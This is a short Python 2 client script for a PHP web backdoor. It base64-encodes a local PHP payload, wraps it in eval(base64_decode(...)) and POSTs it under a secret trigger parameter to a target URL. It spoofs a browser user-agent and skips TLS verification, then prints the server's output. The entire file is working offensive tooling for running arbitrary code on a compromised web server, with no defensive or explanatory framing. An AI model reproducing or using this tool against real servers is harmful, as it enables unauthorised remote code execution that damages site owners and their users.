#!/usr/bin/python2
# coding: utf-8
# php backdoor module client, executes PHP code.
import sys
import requests

def php_encoder(php):
    f = open(php, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    code = "eval(base64_decode('%s'));" %(encoded)
    return code

def execute_php(target, trigger_string, code):
	post_data = {trigger_string: code}
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
	try:
		r = requests.post(url=target, data=post_data, headers=headers, verify=False)
	except Exception, e:
		sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
	if r.text:
		print r.text.strip()

def main(args):
    if len(args) != 4:
        sys.exit("use: %s http://host/index.php secret_string payload.php" %(args[0]))
    execute_php(target=args[1], trigger_string=args[2], code=php_encoder(args[3]))


if __name__ == "__main__":
    main(args=sys.argv)
